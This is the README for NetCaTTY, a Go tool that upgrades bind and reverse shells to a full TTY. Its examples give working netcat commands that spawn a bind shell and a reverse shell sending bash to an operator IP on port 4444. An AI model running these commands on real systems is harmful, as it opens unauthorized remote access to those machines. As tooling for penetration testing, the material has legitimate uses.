# NetCaTTY

A simple TCP socket utility that gives you a TTY.
Either by listening or by connecting.

## Why do I need a TTY?

SSH gives you a TTY. All of the keyboard shortcuts are passed to the remote
shell, such as Ctrl-C or Ctrl-Z.

## Examples

It should be noted that not only bash/sh work, but any type of interactive
terminal command, such as php or python.

Please don't hurt puppers or kitties with it!

### Bind shell

Target machine (with IP 192.168.1.1): `nc -e "/bin/bash -i" -lp 4444`

Your terminal: `./netcatty -a 192.168.1.1:4444`

### Reverse shell

Target machine: `nc -e "/bin/bash -i" 192.168.1.100 4444`

Your terminal (with IP 192.168.1.100): `./netcatty -l :4444`

## Installation

Compile it on your own:

```bash
git clone https://github.com/dzervas/netcatty
cd netcatty
go run netcatty.go -h
```

## Usage

```
Usage of ./netcatty:
  -a string
    	Listen/Connect address in the form of 'ip:port'.
    	Domains, IPv6 as ip and Service as port ('localhost:http') also work. (default ":4444")
  -l	Enable listening mode
```